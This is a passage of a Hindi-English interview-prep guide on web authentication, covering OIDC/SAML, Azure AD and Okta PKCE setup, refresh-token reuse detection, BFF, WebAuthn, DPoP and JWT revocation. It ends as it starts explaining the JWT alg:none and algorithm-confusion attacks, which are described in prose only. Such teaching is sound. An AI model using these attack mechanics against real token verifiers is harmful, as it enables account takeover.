**Interviewer angle:** *"Kya aap ek naye project ke liye SAML introduce karoge?"* — Nahi, choice se nahi. Aap ise sirf support karte ho jab kisi existing enterprise IdP ya partner ke saath integrate kar rahe ho jo isko mandate karta hai. New projects ko OIDC default karna chahiye. Agar dono ko bridge karna zaroori ho, ek identity broker (Azure AD, Okta, Auth0, Keycloak) upstream IdP se SAML accept kar sakta hai aur downstream aapke app ko OIDC present kar sakta hai — yeh ek bahut common integration pattern hai jo explicitly naam lene layak hai.

### 3.6 Azure AD (Entra ID) + Angular MSAL Implementation

**Flow used:** Authorization Code Flow with PKCE.

**Architecture:**
```
Angular App → Azure AD Login Page
       | Authorization Code + PKCE
       v
Azure AD issues Access Token / ID Token
       |
       v
Angular calls .NET API with Bearer Token
```

**Setup steps:**
1. **App register karo** Azure Portal → Entra ID → App registrations → New registration mein. Redirect URI set karo (`http://localhost:4200`), platform type = Single-page application (SPA). **Application (Client) ID** aur **Directory (Tenant) ID** save karo.
2. **API permissions configure karo** — Microsoft Graph `User.Read` add karo, zarurat ke hisab se admin consent grant karo.
3. **(Optional) Backend API expose karo** — Application ID URI set karo (`api://<API_CLIENT_ID>`), ek scope add karo (e.g. `access_as_user`).
4. **MSAL install karo:** `npm install @azure/msal-browser @azure/msal-angular`.
5. **MSAL configure karo** `clientId`, `tenantId`, `redirectUri` ke saath; cache location `sessionStorage` recommended hai; Graph aur aapke backend API ko cover karne wala ek protected resource map define karo. MSAL phir automatically login par redirect karta hai, tokens acquire karta hai, `Authorization` header attach karta hai, aur silently refresh karta hai.
6. **Routes protect karo** `MsalGuard` se.
7. **Login/logout** `loginRedirect()` / `logoutRedirect()` ke through.
8. **API call karo** normally `HttpClient` se — ek MSAL interceptor token fetch karke automatically header attach karta hai.
9. **.NET API secure karo** Microsoft.Identity.Web ke saath, `appsettings.json` mein `Instance`, `TenantId`, `ClientId`, `Audience` configure karke. API phir automatically tokens validate karta hai OIDC metadata/JWKS endpoint ke through.

**Common pitfalls (source notes se):**
- Wrong redirect URI.
- Missing admin consent.
- Incorrect/over-broad scopes.
- CORS misconfiguration.
- Deprecated implicit flow use karna.
- Token audience mismatch (API alag `aud` ke liye issued tokens reject kar deta hai).

**Security best practices (source notes se):**
- Authorization Code + PKCE use karo.
- Kabhi manually tokens store mat karo (MSAL ko apna cache manage karne do).
- HTTPS only.
- Scopes ko least privilege tak limit karo.
- Conditional access policies enable karo.
- Sign-in logs monitor karo.

**Interview one-liner:** Angular MSAL use karke Azure AD ke against Authorization Code + PKCE chalata hai; MSAL ka interceptor silently access token acquire karke outbound API calls mein attach karta hai, aur .NET API Microsoft.Identity.Web middleware ke through Azure AD ke published metadata/JWKS ke against token validate karta hai.

### 3.7 Okta PKCE + Refresh Token + .NET API Implementation

**Angular side (`@okta/okta-angular`, `@okta/okta-auth-js`):**

```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```

- `signInWithRedirect()` / `signOut()` login/logout flow drive karte hain.
- `getAccessToken()` API calls ke liye current access token retrieve karta hai.
- Ek `HttpInterceptor` outbound requests mein automatically `Authorization: Bearer <token>` attach karta hai.

**Token flow:**
```mermaid
flowchart TD
    A[User clicks login] --> B[Angular generates code_verifier]
    B --> C[Creates code_challenge]
    C --> D[Redirect to Okta login]
    D --> E[User authenticates]
    E --> F[Okta returns Authorization Code]
    F --> G["Angular sends code + code_verifier"]
    G --> H["Okta issues Access Token, ID Token, Refresh Token"]
    H --> I[Access token used for API calls]
    I --> J[Access token expires]
    J --> K[Refresh token silently generates new access token]
```

**.NET API side** — Okta-issued tokens validate karna sirf standard JWT bearer configuration hai jo Okta ke Authority par point kiya gaya hai:

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.Authority = "https://dev-12345.okta.com/oauth2/default";
        options.Audience = "api://default";
    });

builder.Services.AddAuthorization();
```

`Authority` set karne se middleware OIDC discovery metadata (JWKS URI including) automatically fetch karta hai, isliye aap kabhi public key hard-code nahi karte — yeh retrieve aur cache hota hai, aur Okta signing keys rotate karta hai to transparently rotate hota hai.

**Key concepts source notes mein call out kiye gaye:**
- **PKCE** authorization code interception attacks prevent karta hai (dekho [3.3](#33-pkce--why-its-now-mandatory-even-for-confidential-clients)).
- **`offline_access` scope** ek refresh token receive karne ke liye bilkul zaroori hai — iske bina, authorization server sirf access/ID tokens issue karta hai.
- **`autoRenew`** (ek okta-auth-js config option) access token expire hone se pehle automatically refresh kar deta hai, app ke liye transparently.

### 3.8 [new content] Refresh Token Rotation & Reuse Detection

Aapke notes ne correctly "no refresh token rotation" ko ek pitfall list kiya, lekin **reuse detection** explain nahi kiya, jo actually wo mechanism hai jo senior interviewers sunna chahte hain.

**Rotation** (already aapke notes mein): har baar jab refresh token use hota hai, server ek *naya* refresh token issue karta hai aur purane ko immediately invalidate kar deta hai. Yeh limit karta hai ki ek stolen refresh token kitni der tak useful rehta hai — lekin rotation akela theft ko *detect* nahi karta, yeh sirf window ko narrow karta hai.

**Reuse detection** wo hai jo rotation ko ek real security control banata hai:

1. Har refresh token, use hone ke baad, "consumed" mark kiya jaata hai (sirf delete nahi kiya jaata).
2. Agar ek **consumed** refresh token kabhi phir se present kiya jaata hai, yeh token theft ka strong signal hai — ek legitimate client ke paas hamesha sirf *latest* token hoga, isliye ek request jisme old, already-rotated token ho, matlab hai either (a) ek race condition (rare, short grace window se handle karo) ya (b) ek attacker jo stolen token replay kar raha hai jabki legitimate user ka flow us se aage rotate ho gaya hai.
3. Reuse detect hone par, server ko **poora token family/session chain revoke** karna chahiye, sirf ek token nahi — full re-authentication force karte hue. Yeh blast radius limit karta hai even agar theft already ho gayi ho.

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker (stole RT1)
    participant S as Auth Server

    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access Token + RT2
    A->>S: Refresh with RT1 (stolen, already consumed)
    S->>S: Detect reuse of consumed token
    S->>S: Revoke entire token family (RT1, RT2, ...)
    S-->>A: 401 Unauthorized
    Note over U,S: Legitimate user is also logged out —\ntrade-off: security over convenience
```

**Interview mein naam lene layak trade-off:** reuse detection par poori family revoke karne ka matlab hai *legitimate* user bhi log out ho jaata hai agar uska token wo stolen wala tha — yeh ek intentional "fail safe" choice hai; alternative (sirf reused token revoke karna) attacker ke rotated descendant token ko abhi bhi valid chhod deta hai, jo point ko defeat kar deta hai.

Yeh bhi mention karne layak hai: **refresh tokens ko device/session metadata se bind karna** (IP range, user agent fingerprint) ek secondary signal ke roop mein — foolproof nahi, lekin bar raise karta hai aur suspected compromise investigate karte waqt richer audit data deta hai.

### 3.9 [new content] Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser

Aapke notes mein "browser ke liye cookie, Postman/mobile ke liye header" dual-mode architecture detail mein cover kiya gaya, lekin **Backend-for-Frontend (BFF)** pattern ke against isko naam ya contrast nahi diya gaya, jo current recommended approach hai (OAuth 2.0 for Browser-Based Apps / BCP ke according) specifically SPAs ke liye.

**Token-in-browser (jo aapke notes describe karte hain):** SPA (ya iska supporting backend) end mein ek token ke saath khatam hota hai jo ultimately browser ki reach mein rehta hai — even agar yeh `localStorage` ki jagah HttpOnly cookie mein ho, browser abhi bhi wo jagah hai jaha tokens issue hote hain aur SPA ke apne origin se directly consume hote hain.

**BFF pattern:** browser kabhi OAuth token dekhta hi nahi.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only\n(HttpOnly, Secure, SameSite)" --> BFF["BFF (your backend)"]
    BFF -- "OAuth Authorization Code + PKCE\n(server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```

- SPA sirf apne backend (BFF) se ek plain session cookie use karke baat karta hai — koi JWT nahi, koi OAuth token JavaScript tak kabhi nahi pahunchta.
- BFF khud OAuth/OIDC dance karta hai (yeh ek confidential client hai, real secrets hold karta hai, tokens ke saath trust kiya ja sakta hai) aur downstream APIs call karte waqt access token attach karta hai.
- Yeh "browser mein token ko safely kaha store karu" wale poore problem ko eliminate kar deta hai, kyunki answer ban jaata hai "kahi nahi — browser ke paas kabhi ek hota hi nahi."

| | Token-in-browser (cookie or header) | BFF pattern |
|---|---|---|
| XSS blast radius | Attacker abhi bhi session ride kar sakta hai (CSRF-style) even HttpOnly cookies ke saath, ya `localStorage` se token seedha steal kar sakta hai | Attacker session cookie ride kar sakta hai lekin kabhi ek portable bearer token nahi obtain karta |
| Complexity | Lower — SPA directly API/auth server se baat karta hai | Higher — build/operate karne ke liye extra backend component |
| Mobile/Postman support | Natural fit (bearer header) | Ek different flow chahiye (native apps typically BFF ki zarurat waise nahi rakhte) |
| Token exposure surface | Browser token ke liye trust boundary ka part hai | Browser kabhi token ki trust boundary ka part nahi hai |
| Recommended by | — | OAuth 2.0 Security Best Current Practice for browser-based apps |

**Interview framing:** aapke notes wala dual-cookie/header approach ek *pragmatic* solution hai jo kaafi real systems ship karte hain — yeh wrong nahi hai, lekin ek senior answer ko recognize karna chahiye ki yeh abhi bhi ek real bearer token browser ke origin ke andar daalta hai, aur BFF pattern ko naam se mention karna chahiye more defense-in-depth alternative ke roop mein jab aap SPA aur uska backend dono control karte ho.

### 3.10 [new content] ASP.NET Core Identity Customization

Source notes mein bilkul present nahi tha, lekin ASP.NET Core Identity customization ek near-certain topic hai ek baar JWT/OAuth basics cover ho jaane ke baad, kyunki zyada tar real .NET systems Identity ko replace karne ki jagah uske upar custom auth layer karte hain.

Common customization points jo senior engineers ko pata hone chahiye:

- **Custom `IdentityUser`**: additional properties (`TenantId`, `DisplayName`, `IsActive`) ke saath extend karo `public class AppUser : IdentityUser<Guid> { ... }` ke through, aur ek matching custom `IdentityDbContext<AppUser, AppRole, Guid>`.
- **Custom password/username validators**: `IPasswordValidator<TUser>` / `IUserValidator<TUser>` implement karo org-specific policy ke liye (e.g., reused passwords disallow karo, built-in options se aage corporate complexity rules enforce karo).
- **Custom claims principal factory**: `UserClaimsPrincipalFactory<TUser>` override karo additional claims (tenant, feature flags, department) sign-in time par cookie/JWT-backed principal mein inject karne ke liye, per-request query karne ki jagah.
- **Token provider replace karna**: Identity ka default cookie-based hota hai; jab Identity users/roles ke liye source of truth hai lekin aapko ek API ke liye JWTs chahiye, typically aap Identity ko purely user/credential management ke liye use karte ho (`SignInManager`, `UserManager`) aur apne khud ke JWTs ek custom endpoint se issue karte ho (exactly wo pattern jo aapke source ke `JwtTokenService` example mein hai) Identity ke cookie auth par API calls ke liye rely karne ki jagah.
- **`AddIdentityCore<TUser>()` vs `AddIdentity<TUser,TRole>()`**: API-only backends ke liye usually aap `AddIdentityCore` chahte ho — yeh cookie-auth/UI scaffolding skip kar deta hai (`SignInManager`'s external cookie schemes, etc.) jo full `AddIdentity` default se wire karta hai, aapko sirf user/role/password management plus upar JWT bearer auth add karne ki ability deta hai.
- **Custom stores**: `IUserStore<TUser>` directly implement karna (EF Core bypass karke) jab users ek external system mein rehte hain (e.g., ek legacy identity DB, ya store ke roop mein Azure AD) — rare hai lekin ek real senior-level scenario hai.

```csharp
// API-only Identity setup — no cookie/UI scaffolding
builder.Services.AddIdentityCore<AppUser>(options =>
    {
        options.Password.RequiredLength = 12;
        options.User.RequireUniqueEmail = true;
    })
    .AddRoles<AppRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(/* ... */);
```

**Interviewer follow-up:** *"Apne API ke liye Identity ka built-in cookie auth kyun nahi use karte?"* — Cookie auth inherently browser/session-oriented hota hai aur naturally non-browser clients (mobile, service-to-service, third-party integrations) ko serve nahi karta ya services ke across statelessly scale nahi karta jaise ek signed JWT karta hai; Identity user/credential/role *management* ke liye right tool rehta hai, jabki JWT issuance/validation actual API authentication concern handle karta hai.

### 3.11 [new content] Multi-Tenant Authentication & Authorization

Source notes se bhi absent, lekin senior SaaS interviews mein extremely common hai.

Key design questions jo interviewer probe karega:

1. **Tenant identity kaha rehti hai?**
   - Token mein ek claim ke roop mein (`tenantId` claim) — simplest, lekin tenant changes ke liye tokens re-issue karne padte hain (ya ek version-check pattern, role changes jaisa hi trade-off jo [4.1](#41-why-jwt-revocation-is-hard--and-the-real-strategies) mein discuss hua).
   - Request se derived (subdomain, custom header, route segment) aur user ke allowed tenants ke against cross-checked — more flexible, per request ek lookup add karta hai.
2. **Single vs multiple identity providers per tenant:**
   - Shared IdP, token ke andar tenant claim (common B2C-style SaaS ke liye jaha aap khud IdP own karte ho).
   - Per-tenant IdP (har enterprise customer apna Azure AD/Okta tenant laata hai) — **dynamic issuer validation** chahiye: aapke `TokenValidationParameters.ValidIssuers` (ya ek custom `IssuerValidator` delegate) ko expected issuer per tenant resolve karna chahiye, single hard-coded value ki jagah.
3. **Cross-tenant leakage #1 real-world bug class hai**: har data query tenant se scoped hona chahiye, aur JWT ke `tenantId` claim par akela rely karna dangerous hai data-access layer par bhi enforce kiye bina (defense in depth — EF Core mein global query filters ek common mitigation hai).
4. **Token audience/issuer per tenant:** agar app-per-tenant Azure AD/Entra external ID model use kar rahe ho, `aud`/`iss` validation tenant-aware hona chahiye, single static string ki jagah.

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
    {
        // Resolve allowed issuer dynamically per tenant, e.g. from a cache of known tenant IdPs
        return _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
            : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer");
    },
    ValidateAudience = true,
    // ...
};
```

**Interview framing:** multi-tenant auth ka hard part almost never token validation khud hota hai — yeh ensure karna hai ki tenant scoping har layer par *consistently* enforce ho (token claim → middleware → data access), kyunki ek single missed filter ek cross-tenant data leak hai.

### 3.12 WebAuthn / FIDO2 / Passkeys [gaps]

Source notes mein bilkul present nahi tha. Yeh 2025/2026 senior interviews ke liye close karne layak sabse highest-signal gaps mein se ek hai: WebAuthn/FIDO2 ("passkeys") par based passwordless auth "emerging standard" se "default recommendation" ban gaya hai major platforms ke across (Apple, Google, Microsoft) aur increasingly enterprise IdPs (Azure AD/Entra ID, Okta) mein. Interviewers ise use karte hain probe karne ke liye ki candidate ka security knowledge "just use MFA/OTP" se aage keep up hua hai ya nahi.

**Core cryptographic idea — steal karne layak koi shared secret nahi:**

Ek password ya OTP (dono *shared secrets* hain — same value client aur server dono par exist karti hai, ya kisi cheez se derive hoti hai jo dono sides jaante hain) ke unlike, WebAuthn **asymmetric key pairs** par built hai jo per device, per site generate hote hain:

- Registration par, authenticator (ek platform authenticator jaise Windows Hello/Touch ID, ya ek roaming wala jaise hardware security key) ek **naya public/private key pair us origin ke liye scoped** generate karta hai (e.g., `app.example.com`).
- **Private key authenticator se kabhi bahar nahi jaata** — yeh typically ek secure enclave/TPM mein sealed hota hai aur exportable nahi hai, user ke liye bhi nahi.
- **Public key server ko bheja aur store kiya jaata hai**, user ke account aur ek `credentialId` se associated.
- Kyunki har key pair ek single origin se bound hota hai, same authenticator ek different site ke liye entirely different key pair produce karta hai — sites ke across kuch bhi reusable nahi hai, ek password ke unlike jo user reuse kar sakta hai.

**Yeh phishing-resistant kyun hai us tarah se jo passwords aur OTP fundamentally nahi hain:**

- Ek password ya OTP sirf ek string hai — yeh *kisi bhi* page mein type (ya auto-fill) kiya ja sakta hai jo isse maangta hai, real site ki convincing phishing clone including. User (ya ek compromised autofill) reliably `example.com` aur `examp1e.com` mein farak nahi bata sakta.
- Ek WebAuthn credential **cryptographically origin se bound** hota hai browser/OS khud se, user ke judgment se nahi. Jab koi site WebAuthn API invoke karta hai, browser actual origin ko signed hone wale data mein include karta hai, aur authenticator sirf us origin ke liye valid signature produce karega jiske against credential register hua tha. Ek different origin par ek phishing site literally ek valid signed assertion obtain nahi kar sakti — koi "user ko trick karo isse type karne ke liye" attack surface nahi hai, kyunki user kabhi kuch secret dekhta ya type karta hi nahi.
- Yeh OTP-based MFA se key interview differentiator hai: OTP abhi bhi user (ya unke browser) par rely karta hai legitimate site ko correctly identify karne ke liye code enter karne se pehle — real-time phishing proxies (e.g., adversary-in-the-middle kits) OTP-based MFA ko routinely defeat karte hain. WebAuthn us human trust step ko entirely remove kar deta hai.

**Registration aur authentication ceremonies, conceptually:**

1. **Registration ("attestation") ceremony:**
   - Server ek random **challenge** generate karta hai aur browser ko bhejta hai relying-party (RP) info (aapke app ka origin) aur user info ke saath.
   - Browser `navigator.credentials.create()` call karta hai, jo platform authenticator invoke karta hai.
   - Authenticator ek naya key pair generate karta hai, naye private key se challenge sign karta hai, aur public key + `credentialId` + attestation data browser ko return karta hai, jo server ko forward karta hai.
   - Server attestation/signature verify karta hai aur **public key + `credentialId` store karta hai** user ke account ke against. Private key device par permanently rehta hai.
2. **Authentication ("assertion") ceremony:**
   - Server ek naya random challenge generate karta hai aur bhejta hai (optionally user ke registered `credentialId`s tak scoped).
   - Browser `navigator.credentials.get()` call karta hai; authenticator user se ek local gesture maangta hai (biometric/PIN/security key tap) aur, agar successful, **stored private key se challenge sign karta hai**.
   - Server us `credentialId` ke liye stored public key lookup karta hai aur signature ko us challenge ke against verify karta hai jo usne issue kiya tha. Agar valid hai, user authenticated hai — koi password ya OTP kabhi transmit nahi hua.

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser/Authenticator
    participant S as Server (Relying Party)

    Note over U,S: Authentication ceremony (login with an existing passkey)
    B->>S: Request login challenge for user
    S->>S: Generate random challenge, store temporarily
    S-->>B: Challenge + allowed credentialId(s)
    B->>U: Prompt for local gesture (biometric/PIN/security key)
    U->>B: Approve (local only — never sent to server)
    B->>B: Sign challenge with device-bound private key
    B->>S: Signed assertion + credentialId
    S->>S: Look up stored public key for credentialId, verify signature against challenge
    S-->>B: Authenticated (issue session/JWT as usual)
```

**Yeh ek ASP.NET Core app mein kaise fit hota hai:**

- ASP.NET Core Identity recent .NET releases mein native passkey/WebAuthn support add kar rahi hai, user ko ek passkey register karne dena additional (ya primary) credential ke roop mein password ke saath (current ASP.NET Core version ke against verify karo — yeh surface actively evolve ho raha hai aur specifics exact release par depend karte hain jo aap target kar rahe ho).
- Native support se pehle/independent, .NET mein long-standing practical option community library **`Fido2NetLib`** hai, jo server-side WebAuthn ceremonies (challenge generation, attestation/assertion verification, credential storage helpers) implement karti hai jinhe aap apne khud ke API endpoints ke peeche wire up karte ho, browser-side `navigator.credentials` calls JS/TypeScript mein done hote hain.
- Library ke regardless, architectural shape hamesha yeh hai: aapka server **Relying Party** ka role play karta hai, public keys + credential IDs store karta hai (passwords nahi) aur apna normal session/JWT issue karta hai ek baar WebAuthn ceremony succeed hone ke baad — WebAuthn *credential-verification* step replace karta hai, aapke existing session/token issuance downstream of login ko nahi.

**Interviewer follow-up:** *"Kya yeh MFA ko replace karta hai?"* — WebAuthn/passkeys ko aksar inherently multi-factor describe kiya jaata hai: something you have (device/authenticator, cryptographically bound) plus something you are/know (biometric ya PIN gate jo local private key unlock karta hai). Kaafi organizations ek passkey login ko apne aap MFA satisfy karte hue treat karte hain, though policy varies karti hai — explicitly state karne layak hai ki yeh ek security-posture decision hai, technical requirement nahi, aur "current ASP.NET Core version"/org policy ke against verify karo ke roop mein mark hona chahiye jab definitive answer de rahe ho.

### 3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession) [gaps]

Source notes mein present nahi tha. DPoP ek newer OAuth extension hai (RFC 9449 ke roop mein finalized) jo senior interviewers increasingly poochte hain kyunki yeh directly bearer tokens ki best-known weakness address karta hai jo iss guide mein aur kahi discuss hui hai (dekho [4.2](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off)) — aur yeh full mTLS (dekho [4.5](#45-new-content-mtls-for-service-to-service-auth)) ka ek lighter-weight alternative hai ek related problem solve karne ke liye.

**Problem: bearer tokens, definitionally, bearer instruments hote hain.**

Iss guide mein kahi aur discuss hua har access token — JWT ya opaque — ek **bearer token** hai: jo bhi ise hold karta hai (bears it) wo use kar sakta hai. Server ke paas legitimate client ko us attacker se distinguish karne ka koi tareeka nahi hai jisne token steal kar liya (XSS se, ek compromised log se, ek leaked proxy se, ek malicious browser extension se, etc.). Ek stolen bearer token kisi bhi IP, kisi bhi device, kisi bhi client se replay ho sakta hai, aur resource server farak nahi bata sakta — yahi wajah hai ki revocation aur short expiry bearer tokens ke liye itni important hai (jaisa [4.1](#41-why-jwt-revocation-is-hard--and-the-real-strategies) mein cover hua), kyunki detection/response, prevention nahi, ek baar bearer token leak hone par sirf yehi lever available hai.

**DPoP ek token ko specific client se kaise bind karta hai:**

DPoP ("Demonstrating Proof of Possession") OAuth ke upar ek cryptographic binding layer add karta hai taaki ek token sirf us client se usable ho jisne originally use request kiya, even agar token khud steal ho jaaye:

1. Client apna khud ka **public/private key pair** generate karta hai (locally held, e.g., browser `CryptoKey`/non-extractable storage ya ek secure module mein — server ko kabhi nahi bheja jaata).
2. **Har** HTTP request ke liye (token request aur baad ki API calls dono), client ek **DPoP proof** create karta hai: ek small, short-lived JWT jisme HTTP method, target URL, ek timestamp, aur ek unique identifier (`jti`) hota hai — aur ise apni private key se sign karta hai.
3. Access token request karte waqt, client yeh DPoP proof include karta hai; authorization server client ki public key ka ek **hash** capture karta hai aur ise issued access token ke andar embed kar deta hai (ek claim ke roop mein, conceptually `cnf.jkt` — "confirmation" / "JWK thumbprint" claim).
4. Har subsequent API call par, client dono **access token** aur ek **fresh DPoP proof** (us specific request ke method/URL/timestamp ke liye signed) bhejta hai ek `Authorization: DPoP <token>` header plus proof carry karne wala `DPoP` header mein.
5. Resource server **do independent cheezein** verify karta hai: (a) DPoP proof ka signature valid hai aur request ke method/URL/recency window se match karta hai, aur (b) us proof mein public key hash access token mein embedded `cnf.jkt` thumbprint se match karta hai. Sirf dono check hone par hi token accept hota hai.

Ek stolen access token akele ab attacker ke liye useless hai — corresponding private key (jo legitimate client se kabhi nahi gaya) ke bina, wo ek valid DPoP proof produce nahi kar sakta, isliye key-hash check resource server par fail ho jaata hai.

| | Plain Bearer Token | DPoP-Bound Token |
|---|---|---|
| Per request kya present kiya jaata hai | Sirf access token | Access token **+** ek freshly signed DPoP proof JWT |
| Ek thief ko replay karne ke liye kya chahiye | Sirf token khud | Token **aur** client ki private key (kabhi transmit nahi hoti, isliye effectively ek token leak se unobtainable) |
| Server-side check | Sirf token par Signature/`iss`/`aud`/`exp` | Token checks **plus** DPoP proof signature **plus** public-key-hash match (`cnf.jkt`) |
| Infrastructure required | Standard OAuth token issuance | Client-side key generation/storage + per-request proof signing; server-side proof verification + `jti` ke liye replay cache |
| Kis se protect karta hai | Normal token expiry se aage kuch nahi | Bearer-token theft/replay ek different client se (XSS token exfiltration, log leakage, etc.) |

```csharp
// Conceptual shape of a DPoP proof JWT (client-side, signed with the client's private key)
// Header: { "typ": "dpop+jwt", "alg": "ES256", "jwk": { /* client's public key */ } }
// Payload:
// {
//   "jti": "unique-per-request-id",
//   "htm": "GET",
//   "htu": "https://api.example.com/orders",
//   "iat": 1730000000
// }
// The resource server verifies this proof's signature against the embedded jwk,
// then checks that SHA256(jwk) matches the "cnf": { "jkt": "<thumbprint>" } claim
// baked into the access token by the authorization server at issuance time.
```

**DPoP vs mTLS — DPoP "lighter-weight" option kyun hai:**

- **mTLS** (dekho [4.5](#45-new-content-mtls-for-service-to-service-auth)) ek token/connection ko client se bind karta hai TLS handshake ke dauraan exchanged ek full X.509 certificate se — strong, lekin certificate issuance, distribution, rotation, aur typically ek service mesh ya gateway operationally sane banane ke liye chahiye. Yeh transport-layer proof of possession hai.
- **DPoP** ek similar *application-layer* goal achieve karta hai (prove karna ki caller ek specific private key hold karta hai) ordinary application-level JWTs aur standard public-key crypto use karke jo client runtime par khud generate kar sakta hai — koi CA nahi, koi certificate lifecycle nahi, TLS handshake ya infrastructure mein koi changes nahi. Yeh SPAs aur mobile apps jaise public clients ke liye far more practical banata hai, jaha client certificate provision karna impractical hai.
- **Trade-off:** DPoP *token* ko protect karta hai, *transport connection* ko nahi — yeh TLS channel khud ko authenticate nahi karta jaise mTLS karta hai, aur thoda per-request overhead add karta hai (proof generate/sign karna, aur resource server ko `jti` par keyed ek short-lived replay cache chahiye us proof ko validity window ke andar replay hone se rokne ke liye). Practically, DPoP aur mTLS overlapping-but-distinct problems solve karte hain aur client type ke basis par chuna jaata hai: mTLS service-to-service/backend contexts ke liye suit karta hai jinke paas already certificate infrastructure hai; DPoP browser/mobile/public-client scenarios ke liye suit karta hai jaha token theft (connection spoofing nahi) primary threat hai jo mitigate ki ja rahi hai.

**Interviewer follow-up:** *"Agar aapke paas already short-lived access tokens hain, to DPoP ki zarurat kyun?"* — Short expiry exposure ki *window* limit karta hai lekin us window ke *andar* replay rokne ke liye kuch nahi karta; ek stolen 5-minute token abhi bhi un 5 minutes ke liye kahi se bhi fully usable hai attacker ke liye. DPoP short expiry ko replace nahi karta — yeh complementary defense-in-depth hai jo stolen token ko khud worthless bana deta hai client ki private key ke bina, chahe wo kitni bhi der ke liye valid ho.

---

## 4. Security & Performance

### 4.1 JWT Revocation Kyun Hard Hai — aur Real Strategies

Kyunki ek JWT self-contained hota hai aur (by default) server state ke against check nahi hota, ek baar issue hone ke baad yeh `exp` tak valid rehta hai — chahe user logout kar le, deactivate ho jaaye, ya token steal ho jaaye.

**A) Bahut short access token lifetime (5–15 min)** — sabse common aur usually sufficient approach. *Refresh* token revoke karo aur short access-token window ke khatam hone ka wait karo.

**B) Revocation list / blacklist by `jti`** — revoked token IDs ko store karo jab tak wo naturally expire na ho jaayein; har request storage check karti hai. State aur ek lookup cost reintroduce karta hai, jo partially JWT ke statelessness benefit ko defeat karta hai — sirf high-value scenarios ke liye use karo (jaise immediate termination requirements).

**C) Token versioning ("session version")** — DB mein `userTokenVersion` store karo, JWT mein ek `ver` claim embed karo, mismatch par reject karo. Phir bhi per request DB/Redis check chahiye — dobara state reintroduce ho jaata hai.

**D) Opaque tokens + introspection** — token ek random string hota hai; API har use par usko validate karne ke liye auth server ko call karta hai. Fully revocable, lekin per request ek network hop add karta hai (full trade-off analysis ke liye [4.2](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off) dekho).

**One-liner:** JWT revocation short expiry, refresh-token revocation, token blacklisting (`jti` se), ya signing-key rotation se achieve hota hai — free lunch koi nahi hai; har option JWT ke original statelessness benefit ka kuch hissa trade away karta hai.

### 4.2 [new content] Opaque Tokens vs JWT for Revocation — Real Trade-off

Aapke notes upar option D mein "opaque tokens + introspection" list karte hain lekin ise woh fundamental architectural choice ke roop mein frame nahi karte jo yeh actually hai. Yeh apne aap ek decision point ke roop mein call out hone ke deserve karta hai:

| | JWT (self-contained) | Opaque token + introspection |
|---|---|---|
| Revocation | Hard — immediate hone ke liye added state chahiye (blacklist/versioning) | Trivial — server-side record delete/flag karo, next introspection call fail ho jaata hai |
| Per-request cost | Zero network calls — pure crypto verification | Har validation ke liye ek network call authorization server ko (jab tak cache na ho) |
| Scalability | Excellent — koi bhi service independently verify kar sakti hai | Introspection endpoint ke throughput se bound; usually short-TTL caching se mitigate kiya jaata hai |
| Information disclosure | Payload kisi bhi token holder ko readable hai (jab tak JWE na ho) | Kuch bhi disclose nahi hota — token issuing system ke bahar meaningless hai |
| Offline/air-gapped verification | Possible (services issuer se contact kiye bina verify kar sakti hain) | Possible nahi — hamesha ek round trip chahiye |
| Typical use | Microservice architectures mein access tokens jahan verification volume high hai | Refresh tokens hamesha; kabhi-kabhi access tokens bhi, jab immediate revocation latency se zyada matter kare (jaise banking, high-security APIs) |

**Senior-level framing:** yeh "JWT vs opaque" ek binary technology choice nahi hai — yeh ek **latency vs revocability trade-off** hai. Systems jinhe instant, guaranteed revocation chahiye (financial transactions, admin sessions) ko opaque + introspection (ya JWT + mandatory blacklist check) ki taraf lean karna chahiye, added hop ke bawajood. Systems jo throughput aur horizontal scale ke liye optimize kar rahe hain, jahan 5–15 minute ka worst-case exposure window acceptable hai, unhe pure stateless JWT ki taraf lean karna chahiye. Kai real systems beech mein land karte hain: JWT access tokens (fast path, short-lived) + opaque refresh tokens (revocable, long-lived) — jo exactly wahi hybrid hai jo aapke source notes throughout describe karte hain.

### 4.3 [new content] JWT Validation Pitfalls: Algorithm Confusion & alg:none

Aapke notes `alg: none` aur "algorithm confusion" ko ek one-line aside ke roop mein mention karte hain ("A classic JWT vulnerability... modern libraries usually protect you, but only if configured correctly"). Yeh JWT interviews mein sabse highest-signal security topics mein se ek hai aur ek full explanation deserve karta hai, kyunki "yeh attack actually kaise kaam karega" ek bahut likely follow-up hai.

**`alg: none` attack:** JWT spec technically ek `alg` value ko `none` hone allow karta hai, jiska matlab hai "yeh token unsigned hai." Agar ek verifier naively token ke apne `alg` header ko trust karta hai aur uske naam wale verification routine ko dispatch karta hai, ek attacker simply `alg: none` set kar sakta hai, signature strip kar sakta hai, aur server ek token accept kar leta hai jise usko outright reject karna chahiye tha. **Fix:** kabhi token ko apna verification algorithm dictate mat karne do — expected algorithm(s) ko server configuration mein explicitly pin karo (jaise `TokenValidationParameters.ValidAlgorithms` ya equivalent), aur kuch bhi aur reject karo, `none` including, unconditionally.

**Algorithm confusion (RS256 → HS256 downgrade) attack:** yeh zyada dangerous variant hai. Agar ek server RS256 tokens verify karne ke liye configure hai ek *public* key use karke, lekin uski JWT library **HS256** tokens bhi happily verify kar degi agar bataya jaaye, ek attacker yeh kar sakta hai:
